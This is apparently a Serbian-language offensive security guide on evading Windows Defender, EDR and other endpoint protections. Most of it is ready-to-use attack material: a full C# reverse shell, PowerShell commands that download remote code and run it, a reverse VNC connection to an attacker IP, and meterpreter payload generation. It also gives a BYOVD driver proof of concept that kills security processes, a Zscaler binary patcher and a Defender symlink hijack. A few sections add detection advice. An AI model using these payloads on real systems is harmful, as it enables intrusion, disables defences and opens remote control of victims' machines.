SmartScreen prvenstveno funkcioniše na osnovu pristupa zasnovanog na reputaciji, što znači da aplikacije koje se retko preuzimaju pokreću SmartScreen, upozoravajući i sprečavajući krajnjeg korisnika da izvrši fajl (iako se fajl i dalje može pokrenuti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je NTFS Alternate Data Stream pod imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kojeg je preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani pouzdanim potpisnim sertifikatom neće aktivirati SmartScreen.

Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web je da ih zapakujete u neki kontejner poput ISO. Ovo se dešava zato što Mark-of-the-Web (MOTW) ne može biti primenjen na non NTFS volumene.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windowsu koji omogućava aplikacijama i sistemskim komponentama da **zabeležavaju događaje**. Međutim, takođe se može koristiti i od strane bezbednosnih proizvoda za praćenje i detekciju malicioznih aktivnosti.

Slično načinu na koji se AMSI onemogućava (bypassa), moguće je i naterati funkciju **`EtwEventWrite`** korisničkog procesa da odmah vrati bez beleženja ikakvih događaja. Ovo se postiže patchovanjem funkcije u memoriji da odmah vrati, čime se efikasno onemogućava ETW logovanje za taj proces.

Više informacija možete pronaći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Učitavanje C# binarnih fajlova u memoriju poznato je već dugo i i dalje je odličan način za pokretanje vaših post-exploitation alata bez da vas AV otkrije.

Pošto će payload biti učitan direktno u memoriju bez pristupa disku, jedino što ćemo morati da rešimo jeste patchovanje AMSI za ceo proces.

Većina C2 frameworka (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već omogućava izvršavanje C# assemblies direktno u memoriji, ali postoje različiti načini da se to uradi:

- **Fork\&Run**

To podrazumeva **pokretanje novog žrtvovanog procesa**, injektovanje vašeg post-exploitation malicioznog koda u taj novi proces, izvršenje koda i, po završetku, ubijanje tog procesa. Ovo ima i prednosti i mane. Prednost Fork&Run metode je što se izvršavanje dešava **izvan** našeg Beacon implant procesa. To znači da ako nešto u našoj post-exploitation akciji krene po zlu ili bude otkriveno, postoji **značajno veća šansa** da naš **implant preživi.** Mana je što postoji **veća šansa** da budete otkriveni od strane **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injektovanju post-exploitation malicioznog koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali mana je u tome što ako nešto krene po zlu pri izvršavanju vašeg payload-a, postoji **značajno veća šansa** da **izgubite svoj beacon** jer može doći do pada procesa.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o učitavanju C# Assembly, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitavati C# Assemblies **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t-ov video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati maliciozni kod koristeći druge jezike tako što se kompromitovanom mašinom omogući pristup **interpreter environment installed on the Attacker Controlled SMB share**.

Dozvoljavanjem pristupa Interpreter Binaries i okruženju na SMB share-u možete **execute arbitrary code in these languages within memory** kompromitovane mašine.

Repo navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti da zaobiđemo statičke potpise**. Testiranje sa nasumičnim ne-obfuskiranim reverse shell skriptama u tim jezicima pokazalo se uspešnim.

## TokenStomping

Token stomping je tehnika koja napadaču omogućava da **manipuliše access token-om ili bezbednosnim proizvodom kao što su EDR ili AV**, dozvoljavajući im da smanje njegove privilegije tako da proces neće umreti, ali neće imati dozvole da proverava maliciozne aktivnosti.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kao što je opisano u [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je instalirati Chrome Remote Desktop na žrtvin PC i zatim ga iskoristiti za preuzimanje kontrole i održavanje persistence:
1. Preuzmite sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", i zatim kliknite na MSI fajl za Windows da preuzmete MSI.
2. Pokrenite instalaciju tiho na žrtvi (potreban admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na Chrome Remote Desktop stranicu i kliknite next. Wizard će zatim tražiti autorizaciju; kliknite Authorize da nastavite.
4. Izvršite dati parametar sa nekim prilagodbama: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Obratite pažnju na parametar pin koji omogućava postavljanje pina bez korišćenja GUI-a).


## Advanced Evasion

Evasion je vrlo komplikovana tema, ponekad morate uzeti u obzir mnoge različite izvore telemetrije u samo jednom sistemu, tako da je prilično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kojeg se borite ima svoje snage i slabosti.

Toplo vam preporučujem da pogledate ovaj govor od [@ATTL4S](https://twitter.com/DaniLJ94), da steknete uvid u naprednije tehnike evazije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe još jedan odličan govor od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **uklanjati delove binarnog fajla** dok ne **otkrije koji deo Defender** smatra malicioznim i podeliti vam to.\
Drugi alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa web servisom koji nudi uslugu na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows sistemi su dolazili sa **Telnet server-om** koji ste mogli instalirati (kao administrator) koristeći:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** pri pokretanju sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (stealth) i onemogući firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (trebate bin preuzimanja, ne setup)

**ON THE HOST**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim, premestite binarni fajl _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.ini**_ u **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste održali stealth ne smete uraditi sledeće

- Ne pokrećite `winvnc` ako već radi ili ćete pokrenuti a [popup](https://i.imgur.com/1SROTTl.png). Proverite da li radi sa `tasklist | findstr winvnc`
- Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će se otvoriti [the config window](https://i.imgur.com/rfMQWcf.png)
- Ne pokrećite `winvnc -h` za help ili ćete pokrenuti a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** sa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni Defender će vrlo brzo prekinuti proces.**

### Kompajliranje našeg vlastitog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using kompajler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatora za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje python-a za primer izrade injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 je iskoristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući endpoint zaštite pre nego što pusti ransomware. Alat donosi svoj **vlastiti ranjivi ali *potpisani* driver** i zloupotrebljava ga za izvođenje privilegovanih kernel operacija koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu blokirati.

Ključni zaključci
1. **Potpisani driver**: Fajl isporučen na disk je `ServiceMouse.sys`, ali binarni fajl je legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs’ “System In-Depth Analysis Toolkit”. Pošto driver nosi važeći Microsoft sertifikat, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prvi red registruje driver kao **kernel service**, a drugi ga pokreće tako da `\\.\ServiceMouse` postane dostupan iz user land-a.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto ovo radi**: BYOVD potpuno preskače user-mode zaštite; kod koji se izvršava u kernelu može otvoriti *protected* procese, terminisati ih ili manipulisati kernel objektima bez obzira na PPL/PP, ELAM ili druge hardening mehanizme.

Detection / Mitigation
•  Omogućite Microsoft-ovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) tako da Windows odbije da učita `AToolsKrnl64.sys`.  
•  Monitorirajte kreiranje novih *kernel* servisa i alarmirajte kada se driver učita iz world-writable direktorijuma ili nije na allow-listi.  
•  Pratite user-mode handle-ove ka custom device objektima praćene sumnjivim `DeviceIoControl` pozivima.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** primenjuje device-posture pravila lokalno i oslanja se na Windows RPC da saopšti rezultate drugim komponentama. Dva slaba dizajnerska izbora omogućavaju potpuni bypass:

1. Posture evaluacija se vrši **potpuno klijentski** (boolean se šalje serveru).  
2. Interni RPC endpoint-i samo validiraju da je povezani izvršni fajl **potpisan od strane Zscaler** (putem `WinVerifyTrust`).

Patchovanjem četiri potpisana binarna fajla na disku obe mehanizme je moguće neutralisati:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` tako da je svaka provera compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ bilo koji (čak i nepotpisani) proces može bind-ovati RPC pipe-ove |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Izvod minimalnog patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i ponovnog pokretanja servisnog stacka:

* **Sve** posture checks prikazuju **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler politikama.

Ova studija slučaja pokazuje kako odluke o poverenju na strani klijenta i jednostavne provere potpisa mogu biti zaobiđene uz samo nekoliko izmena bajtova.

## Zloupotreba Protected Process Light (PPL) za manipulaciju AV/EDR pomoću LOLBINs

Protected Process Light (PPL) sprovodi signer/level hijerarhiju tako da samo procesi sa istim ili višim nivoom zaštite mogu menjati jedni druge. Ofanzivno, ako legalno pokrenete PPL-enabled binary i kontrolišete njegove argumente, možete pretvoriti benignu funkcionalnost (npr. logging) u ograničen, PPL-podržan write primitive prema zaštićenim direktorijumima koje koriste AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` samostalno se pokreće i prihvata parametar za upis log fajla na putanju koju navede pozivalac.
- Kada se pokrene kao PPL proces, zapisivanje fajla se vrši uz PPL podršku.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite 8.3 short paths da ciljate u normalno zaštićene lokacije.

8.3 short path helpers
- Prikažite kratke nazive: `dir /x` u svakom nadređenom direktorijumu.
- Dobijte kratku putanju u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Pokrenite LOLBIN koji podržava PPL (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za putanju loga kako biste prouzrokovali kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Koristite 8.3 short names ako je potrebno.
3) Ako ciljani binarni fajl obično bude otvoren/zaključan od strane AV dok radi (npr. MsMpEng.exe), zakažite upis pri boot-u pre nego što AV startuje instaliranjem auto-start servisa koji se pouzdano izvršava ranije. Potvrdite redosled boot-a pomoću Process Monitor (boot logging).
4) Na reboot-u zapisivanje uz PPL podršku se dešava pre nego što AV zaključa svoje binarne fajlove, korumpirajući ciljani fajl i sprečavajući pokretanje.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Napomene i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje osim pozicije; primitiv je pogodniji za korupciju nego za preciznu injekciju sadržaja.
- Zahteva lokalnog administratora/SYSTEM za instalaciju/pokretanje servisa i vreme za reboot.
- Vreme je kritično: cilj ne sme biti otvoren; izvršavanje pri boot-u izbegava zaključavanje fajlova.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito ako je parent-ovan od nestandardnih pokretača, oko boot-a.
- Novi servisi konfigurisani da auto-startuju sumnjive binarije i koji dosledno startuju pre Defender/AV. Istražite kreiranje/izmenu servisa pre neuspeha u pokretanju Defender-a.
- Monitorisanje integriteta fajlova za Defender binarije/Platform direktorijume; neočekivana kreiranja/izmene fajlova od procesa sa protected-process zastavicama.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od binarija koje nisu AV.

Mitigacije
- WDAC/Code Integrity: ograničite koji potpisani binariji mogu da rade kao PPL i pod kojim roditeljskim procesima; blokirajte poziv ClipUp izvan legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu servisa sa auto-start i pratite manipulacije redosledom pokretanja.
- Osigurajte da su Defender tamper protection i early-launch zaštite omogućeni; istražite greške pri pokretanju koje ukazuju na korupciju binarija.
- Razmotrite onemogućavanje 8.3 short-name generisanja na volum-ima koji hostuju security tooling ako je kompatibilno sa vašim okruženjem (pažljivo testirajte).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender bira platformu iz koje se izvršava tako što nabraja podfoldere ispod:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Izabere podfolder sa najvećim leksikografskim verzionim stringom (npr. `4.18.25070.5-0`), zatim pokreće Defender service procese odatle (ažurirajući service/registry puteve u skladu). Ovaj izbor veruje unosima direktorijuma uključujući directory reparse points (symlinks). Administrator može iskoristiti ovo da preusmeri Defender na putanju zapisivu od strane napadača i ostvari DLL sideloading ili prekid rada servisa.

Preduslovi
- Lokalni Administrator (potreban za kreiranje direktorijuma/symlink-ova u okviru Platform folder-a)
- Mogućnost reboot-a ili izazivanja ponovnog izbora Defender platforme (restart servisa pri boot-u)
- Potrebni su samo ugrađeni alati (mklink)

Zašto ovo radi
- Defender blokira upise u sopstvenim folderima, ali njegov izbor platforme veruje unosima direktorijuma i bira leksikografski najveću verziju bez validacije da li cilj resolve-uje na zaštićenu/pouzdanu putanju.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte higher-version directory symlink unutar Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučeno ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li MsMpEng.exe (WinDefend) radi iz preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Treba da primetite novu putanju procesa pod `C:\TMP\AV\` i service configuration/registry koja odražava tu lokaciju.

Post-exploitation options
- DLL sideloading/code execution: Postavite/zamenite DLLs koje Defender učitava iz svog application directory-a kako biste execute code u Defender-ovim procesima. Pogledajte odeljak iznad: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink tako da se pri sledećem startu konfigurisan path ne može resolve-ovati i Defender neće moći da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne obezbeđuje privilege escalation; zahteva admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams mogu premestiti runtime evasion iz C2 implant-a u sam cilj‑modul tako što će hook‑ovati njegov Import Address Table (IAT) i usmeriti odabrane API‑je kroz attacker‑controlled, position‑independent code (PIC). Ovo generalizuje evasion izvan malog API surface koji mnogi kitovi izlažu (npr. CreateProcessA), i proširuje iste zaštite na BOFs i post‑exploitation DLLs.

Opšti pristup
- Postavite PIC blob pored cilj‑modula koristeći reflective loader (prepended or companion). PIC mora biti self‑contained i position‑independent.
- Dok se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i patch‑ujte IAT unose za ciljne imports (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) da pokazuju na tanke PIC wrappers.
- Svaki PIC wrapper izvodi evasions pre tail‑poziva stvarne API adrese. Tipične evasions uključuju:
  - Memory mask/unmask oko poziva (npr. encrypt beacon regions, RWX→RX, promena imena/permissions stranica) i vraćanje nakon poziva.
  - Call‑stack spoofing: konstruisati benign stack i preći u target API tako da call‑stack analiza rezolvuje u očekivane frames.
